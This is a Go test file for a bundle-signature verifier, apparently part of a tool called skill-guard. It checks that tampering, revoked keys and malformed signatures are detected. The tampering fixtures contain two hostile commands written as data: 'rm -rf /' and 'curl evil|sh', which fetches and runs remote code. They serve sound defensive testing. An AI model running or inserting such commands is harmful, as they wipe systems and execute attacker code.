package verify

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/SVGreg/skill-guard/pkg/attest"
	"github.com/SVGreg/skill-guard/pkg/attest/oms"
	"github.com/SVGreg/skill-guard/pkg/policy"
	"github.com/SVGreg/skill-guard/pkg/skill"
)

// hasRule reports whether a result carries a finding with the given rule id.
// (verify_test.go's hasFinding matches on title; ids are what this file cares
// about, since the wording of an OMS finding differs from its SGMT-1 twin.)
func hasRule(res *Result, id string) bool {
	for _, f := range res.Findings {
		if f.RuleID == id {
			return true
		}
	}
	return false
}

// omsFixture signs a small bundle and returns the bundle, the serialized OMS
// signature, and a roster trusting the signing key.
func omsFixture(t *testing.T) (*skill.Bundle, []byte, policy.Trust) {
	t.Helper()
	signer, err := attest.GenerateKeyAlg("sg-aabbccdd0011", attest.AlgECDSAP256)
	if err != nil {
		t.Fatalf("GenerateKeyAlg: %v", err)
	}
	b := &skill.Bundle{Root: "/tmp/demo", Files: []skill.File{
		{Path: "SKILL.md", Content: []byte("---\nname: demo\n---\nbody\n")},
		{Path: "scripts/setup.sh", Content: []byte("#!/bin/sh\necho hi\n")},
	}}
	signed, err := oms.SignBundle(context.Background(), b, signer, oms.EnumOptions{})
	if err != nil {
		t.Fatalf("SignBundle: %v", err)
	}
	data, err := json.Marshal(signed)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	roster := policy.Trust{Keys: []policy.Key{{
		KeyID:     signer.KeyID(),
		Algorithm: attest.AlgECDSAP256,
		PublicKey: signer.PublicKeyBase64(),
		Identity:  "oidc:demo@example.com",
	}}}
	return b, data, roster
}

// TestVerifyOMSHappyPath is the M4-07 acceptance check for a well-formed
// bundle: signature valid, key trusted, manifest matching, format reported.
func TestVerifyOMSHappyPath(t *testing.T) {
	b, data, roster := omsFixture(t)
	res := VerifyOMS(b, data, roster)

	if res.Format != FormatOMS {
		t.Errorf("format = %q, want %q", res.Format, FormatOMS)
	}
	if !res.Present || !res.SignatureValid || !res.Trusted || !res.MerkleMatch {
		t.Fatalf("unexpected result: %+v", res)
	}
	if res.Publisher != "oidc:demo@example.com" {
		t.Errorf("publisher = %q, want the roster identity", res.Publisher)
	}
	if hasRule(res, "SG-PRV-002") || hasRule(res, "SG-PRV-003") {
		t.Errorf("clean bundle produced failure findings: %+v", res.Findings)
	}
	// An OMS bundle attests digests, never a scan verdict; saying so is the
	// point of this finding.
	if !hasRule(res, "SG-PRV-006") {
		t.Error("expected SG-PRV-006 noting no scan result is carried")
	}
}

// TestVerifyOMSDetectsTampering covers the three §8.4/§8.5 failure modes.
func TestVerifyOMSDetectsTampering(t *testing.T) {
	cases := []struct {
		name   string
		mutate func(b *skill.Bundle)
	}{
		{"content changed", func(b *skill.Bundle) {
			b.Files[1].Content = append(b.Files[1].Content, []byte("rm -rf /\n")...)
		}},
		{"signed file removed", func(b *skill.Bundle) {
			b.Files = b.Files[:1]
		}},
		{"unsigned file added", func(b *skill.Bundle) {
			b.Files = append(b.Files, skill.File{Path: "payload.sh", Content: []byte("curl evil|sh\n")})
		}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			b, data, roster := omsFixture(t)
			c.mutate(b)
			res := VerifyOMS(b, data, roster)
			if res.MerkleMatch {
				t.Error("manifest reported as matching after tampering")
			}
			if !hasRule(res, "SG-PRV-003") {
				t.Errorf("no SG-PRV-003 finding: %+v", res.Findings)
			}
			// The signature itself is still valid — only the tree changed.
			if !res.SignatureValid {
				t.Error("signature should still verify; the payload was not touched")
			}
		})
	}
}

func TestVerifyOMSUntrustedAndRevoked(t *testing.T) {
	b, data, roster := omsFixture(t)

	// No roster at all: unverified identity, not a claim of tampering.
	res := VerifyOMS(b, data, policy.Trust{})
	if res.SignatureValid || res.Trusted {
		t.Error("a signature verified with no roster configured")
	}
	if !hasRule(res, "SG-PRV-005") {
		t.Errorf("want SG-PRV-005 for an empty roster, got %+v", res.Findings)
	}

	// Revoked key: valid signature, no trust.
	revoked := roster
	revoked.Revoked = []string{roster.Keys[0].KeyID}
	res = VerifyOMS(b, data, revoked)
	if !res.SignatureValid || res.Trusted || !res.Revoked {
		t.Errorf("revoked key handled wrong: %+v", res)
	}
	if !hasRule(res, "SG-PRV-004") {
		t.Errorf("want SG-PRV-004 for a revoked key, got %+v", res.Findings)
	}

	// A different key in the roster must not validate this signature.
	other, err := attest.GenerateKeyAlg("sg-ffffffffffff", attest.AlgECDSAP256)
	if err != nil {
		t.Fatalf("GenerateKeyAlg: %v", err)
	}
	wrong := policy.Trust{Keys: []policy.Key{{
		KeyID: other.KeyID(), Algorithm: attest.AlgECDSAP256, PublicKey: other.PublicKeyBase64(),
	}}}
	res = VerifyOMS(b, data, wrong)
	if res.SignatureValid {
		t.Error("a signature verified against an unrelated key")
	}
	if !hasRule(res, "SG-PRV-002") {
		t.Errorf("want SG-PRV-002 for a non-matching roster, got %+v", res.Findings)
	}
}

// TestVerifyOMSRejectsVendoredInvalidVectors uses the spec's own known-bad
// bundles as the rejection oracle — the same files pkg/attest/oms parses.
func TestVerifyOMSRejectsVendoredInvalidVectors(t *testing.T) {
	dir := filepath.Join("..", "attest", "oms", "testdata", "vectors")
	for _, rel := range []string{
		"invalid/empty.bundle.json",
		"invalid/missing-envelope.bundle.json",
		"invalid/missing-verification-material.bundle.json",
		"invalid/missing-tlog-entries.bundle.json",
		"invalid-payload/wrong-predicate.bundle.json",
	} {
		t.Run(rel, func(t *testing.T) {
			data, err := os.ReadFile(filepath.Join(dir, rel))
			if err != nil {
				t.Fatalf("read vector: %v", err)
			}
			b := &skill.Bundle{Root: "/tmp/demo", Files: []skill.File{{Path: "SKILL.md", Content: []byte("x")}}}
			res := VerifyOMS(b, data, policy.Trust{})
			if res.MerkleMatch || res.Trusted {
				t.Errorf("an invalid bundle was accepted: %+v", res)
			}
			if !hasRule(res, "SG-PRV-002") {
				t.Errorf("want SG-PRV-002 for %s, got %+v", rel, res.Findings)
			}
		})
	}
}

// TestVerifyOMSEmptyFileIsMalformed: an existing but empty signature file is
// corruption, not absence. The spec ships this exact case as a vector.
func TestVerifyOMSEmptyFileIsMalformed(t *testing.T) {
	b := &skill.Bundle{Root: "/tmp/demo", Files: []skill.File{{Path: "SKILL.md", Content: []byte("x")}}}
	res := VerifyOMS(b, []byte{}, policy.Trust{})
	if !res.Present {
		t.Error("an existing empty file was reported as no signature at all")
	}
	if !hasRule(res, "SG-PRV-002") {
		t.Errorf("want SG-PRV-002 for an empty bundle file, got %+v", res.Findings)
	}
}

// TestVerifyOMSAbsent: no file is a reportable state, not an error.
func TestVerifyOMSAbsent(t *testing.T) {
	b := &skill.Bundle{Root: "/tmp/demo", Files: []skill.File{{Path: "SKILL.md", Content: []byte("x")}}}
	res := VerifyOMS(b, nil, policy.Trust{})
	if res.Present {
		t.Error("absent signature reported as present")
	}
	if !hasRule(res, "SG-PRV-001") {
		t.Errorf("want SG-PRV-001, got %+v", res.Findings)
	}
}

// TestOMSSignatureFileIsNotSelfCovering: writing skill.oms.sig into a bundle
// must not invalidate the SGMT-1 attestation already there. This was a real
// bug — the OMS signature became a Merkle leaf and turned a freshly signed
// bundle into a MISMATCH.
func TestOMSSignatureFileIsNotSelfCovering(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"),
		[]byte("---\nname: demo\ndescription: d\n---\nbody\n"), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
	before, err := skill.LoadBundle(dir)
	if err != nil {
		t.Fatalf("LoadBundle: %v", err)
	}
	rootBefore := attest.MerkleRoot(attest.BundleLeaves(before))

	if err := os.WriteFile(filepath.Join(dir, oms.SigFileName), []byte(`{"mediaType":"x"}`), 0o644); err != nil {
		t.Fatalf("write signature: %v", err)
	}
	after, err := skill.LoadBundle(dir)
	if err != nil {
		t.Fatalf("LoadBundle: %v", err)
	}
	if got := attest.MerkleRoot(attest.BundleLeaves(after)); got != rootBefore {
		t.Errorf("Merkle root changed when %s was added: %s → %s", oms.SigFileName, rootBefore, got)
	}
}
